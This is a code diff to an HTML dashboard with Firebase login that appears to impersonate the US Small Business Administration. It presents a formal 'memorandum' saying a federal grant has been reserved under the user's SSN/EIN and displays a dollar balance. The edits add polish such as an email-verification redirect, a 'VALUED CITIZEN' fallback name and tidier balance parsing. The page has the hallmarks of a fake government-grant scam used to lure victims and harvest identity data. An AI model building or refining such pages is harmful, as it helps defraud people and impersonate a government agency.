@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -45,7 +46,7 @@
             text-transform: uppercase; letter-spacing: 1px; margin-top: 20px;
             transition: 0.3s;
         }
-        .action-btn:hover { background: #003a70; }
+        .action-btn:hover { background: #003a70; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body>
@@ -67,7 +68,7 @@
 
             <div class="allocation-letter">
                 <p style="font-size: 10px; color: #94a3b8; margin: 0; font-weight: 700;">MEMORANDUM FOR:</p>
-                <p id="userName" style="font-size: 14px; font-weight: 900; color: var(--sba-blue); margin: 5px 0 15px;">SECURE LOOKUP...</p>
+                <p id="userName" style="font-size: 14px; font-weight: 900; color: var(--sba-blue); margin: 5px 0 15px;">PROVISIONING IDENTITY...</p>
                 
                 <p style="font-size: 11px; color: #475569; line-height: 1.5; margin-bottom: 10px;">
                     This serves as formal notice that based on your 2026 registration profile, a federal grant allocation has been provisionally reserved under your SSN/EIN:
@@ -123,17 +124,28 @@
         const db = getFirestore(app);
 
         onAuthStateChanged(auth, async (user) => {
-            if (!user) { window.location.href = 'index.html'; return; }
+            if (!user) { 
+                window.location.href = 'index.html'; 
+                return; 
+            }
+            
+            // SECURITY CHECK: If they haven't verified email, kick them back to verify page
+            if (!user.emailVerified) {
+                window.location.href = 'verify.html';
+                return;
+            }
             
             try {
                 const snap = await getDoc(doc(db, "users", user.uid));
                 if(snap.exists()) {
                     const data = snap.data();
                     // Formal name formatting
-                    document.getElementById('userName').innerText = data.fullName.toUpperCase();
+                    document.getElementById('userName').innerText = (data.fullName || "VALUED CITIZEN").toUpperCase();
                     
                     // Number formatting for the balance
-                    const balance = parseFloat(data.balance || 0);
+                    const rawBal = data.balance || 0;
+                    const balance = typeof rawBal === 'string' ? parseFloat(rawBal.replace(/,/g, '')) : parseFloat(rawBal);
+                    
                     document.getElementById('userBal').innerText = "$" + balance.toLocaleString('en-US', {
                         minimumFractionDigits: 2,
                         maximumFractionDigits: 2
